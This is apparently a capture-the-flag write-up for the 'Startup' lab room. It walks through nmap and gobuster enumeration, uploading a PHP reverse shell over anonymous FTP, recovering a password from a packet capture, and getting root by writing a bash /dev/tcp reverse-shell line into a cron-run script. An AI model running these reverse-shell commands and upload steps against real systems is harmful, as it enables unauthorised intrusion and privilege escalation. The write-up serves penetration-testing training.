## Nmap: 
---
```bash 
nmap -T4 -n -A 10.64.186.249 -oN nmap
```

```bash
Nmap scan report for 10.64.186.249
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.154.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
7106/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- we see that a web-server is running, `SSH` and `FTP` are open 
- we also see that we can log into `FTP` with the user: `anonymous` 
- lets do this first 
## FTP:
---
```bash
ftp 10.64.186.249
```
- as already said as user we can use `anonymous` and when we get prompt a password we can just press `ENTER` 
- when we list out the current directory, we see this: 
```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||12072|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```
- lets download all files with `get <filename>`
- i checked the `ftp` directory, but it was empty

- `notice.txt`: 
```bash
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
- so we find the first potential username: `Maya`
- in `.test.log` was just the `test` and the `importan.jpg` was the mentioned `Among Us` meme 
- lets look at the web-server now
## further Enumeration: 
---
![](Startup/images/Startup_1.png)
- this is the first thing we see when we open up the site 
- there was nothing special in the `source-code`, so lets use `Gobuster` to find other files or directory's on this web-server
### Gobuster: 
---
```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://10.64.186.249 -o gobuster/first_enum
```

```bash
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/files                (Status: 301) [Size: 314] [--> http://10.64.186.249/files/]
/index.html           (Status: 200) [Size: 808]
/server-status        (Status: 403) [Size: 278]
```
- there is a `/files` directory, lets look into that: 
![](Startup/images/Startup_2.png)
- So these are the same files we saw when we logged into the `FTP` server
- we could try to upload a `reverse-shell` into that directory with `FTP` 
## revers-shell: 
---
- lets use the `PHP` reverse-shell, from this site: https://github.com/pentestmonkey/php-reverse-shell 
- to make it work, we have to change we `IP` in the `reverse-shell`: 
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
- after that I moved the `reverse-shell` into my working directory
- we can upload files in `FTP` with the command: `put` or `STOR` 
- lets log back into `FTP` and try this:
```bash
ftp 10.64.186.249
```
- after that we have to change the directory with `cd` to `ftp`, because we can write in this `directory`
- then: 
```ftp
put php-reverse-shell.php
```
- it works 
- lets go back to the web-server and see if can run the `reverse-shell`: 
![](Startup/images/Startup_3.png)
- so we see the `reverse-shell`, that's a good sign 
- lets setup a listener with `netcat` on our attacker-machine: 
```bash
nc -lnvp 1234
```
- **NOTE:** the Port has to match the Port you set in the `reverse-shell` 
- lets click on the `reverse-shell` on the website and hope we get a shell 

![](Startup/images/Startup_4.png)
- it worked and now we got a `shell` 

## Privilege Escalation: 
---
- to stabilize the shell a little bit I always use this: 
```bash 
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

- we are currently in the `/` directory, lets list it out to see if there is anything useful:
```bash 
drwxr-xr-x  25 root     root      4096 Dec 24 20:10 .
drwxr-xr-x  25 root     root      4096 Dec 24 20:10 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Dec 24 20:10 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 121 root     root         0 Dec 24 20:10 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Dec 24 20:29 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Dec 24 20:54 sys
drwxrwxrwt   7 root     root      4096 Dec 24 20:54 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
```

- we can see there is `recipe.txt` and a `incidents` directory both owned by us
- lets read the `recipe.txt`: 
```bash
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was <Redacted>.
```
- so now we can answer the first question of the room 
 
- lets look into the `incidents` directory: 
```bash 
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 Dec 24 20:10 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```
- a `.pcapng` file, lets try to download it 

- lets set up a `HTTP-Server` on the target-machine with `python3`: 
```bash
python3 -m http.server
```
- when we don't specify a port the default port is `8000` 
- now we can get the file with `wget` on our machine: 
```bash
wget http://10.64.186.249:8000/suspicious.pcapng
```

### Wireshark: 
---
- lets open the file with `Wireshark`, to see which packets where captured: 
```bash
wireshark suspicious.pcapng
```

![](Startup/images/Startup_5.png)
- we see a lot of `TCP` packets and a little bit of `HTTP` packets 
- in the picture you can see the `34.` packet is a `HTTP` packet that requested a `shell.php` from we same path on the web-server, as we did to get a `reverse-shell` going
- so maybe someone else did the same thing as we did 
- lets check the `TCP`-stream (in Wireshark: Analyze -> Follow -> TCP Stream)
- when we got to Stream `7` we can see this: 
![](Startup/images/Startup_6.png)
- so someone did also start a `reverse-shell` and executed commands 
- we can see that this person tried to run `suod -l`, but had a wrong password 
- we could try to use this password to log into `lennie` 

- it works, now we can read the `user.txt`: 
```bash 
THM{<Redacted>}
```

- there is more in his directory: 
```bash
total 20
drwx------ 4 lennie lennie 4096 Nov 12  2020 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
```

- lets look into `scripts`: 
```bash 
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Dec 24 21:16 startup_list.txt
```

- the `startup_list.txt` was empty so lets look into `planner.sh`: 
```bash 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
- so we see that `/etc/print.sh` gets executed in the `planner.sh` and the file is owned by `root`

- `print.sh`: 
```bash 
-rwx------ 1 lennie lennie 25 Nov 12  2020 print.sh
```
- we can write to `print.sh`
- but because we cant run the `planner.sh` with root privileges, I thought that maybe a `cronjob` is set for this file, but i didn't find anything 
- I started to look through the internet to find a tool that would list out processes without needing root privileges, so i found: `pspy64` (https://github.com/DominicBreuker/pspy)
- lets get this script on the machine, the same way we did with the `.pcapng`, just the other way around 

- lets run the script and see if we see a process that runs the `planner.sh` 
![](Startup/images/Startup_7.png)
- here we can see that `planner.sh` gets executed every minute 
- we now could place a reverse-shell in `print.sh` and setup a listener on our machine and wait for a connection:
```bash
nc -lnvp 1235
```

```bash 
echo "/bin/bash -i >& /dev/tcp/192.168.154.152/1235 0>&1" > print.sh 
```
- lets wait

![](Startup/images/Startup_8.png)
- we got a `root-shell`, we can now read `root.txt`: 
```bash
THM{<Redacted>}  
```
